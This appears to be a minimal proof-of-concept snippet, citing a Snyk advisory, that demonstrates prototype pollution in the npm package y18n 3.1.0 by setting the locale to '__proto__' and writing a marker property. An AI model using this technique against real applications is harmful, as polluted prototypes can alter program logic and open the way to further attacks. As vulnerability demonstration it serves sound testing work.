//https://snyk.io/test/npm/y18n/3.1.0
  const y18n = require("y18n")();
  
  y18n.setLocale("__proto__");
  y18n.updateLocale({ polluted: "yes" }); //payload
